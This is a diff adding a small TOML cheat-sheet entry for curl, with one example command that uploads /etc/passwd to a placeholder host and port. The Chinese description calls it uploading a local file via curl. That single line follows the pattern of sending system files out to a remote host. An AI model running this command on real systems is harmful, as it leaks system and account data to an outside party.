@@ -1,0 +1,9 @@
+examples = []
+[[hit]]
+command = "curl -F \"file=@/etc/passwd\" http://<host>:<port>/"
+description = "通过 curl 上传本地文件"
+
+[meta]
+name = "curl"
+description = "Quick reference for curl"
+url = ""
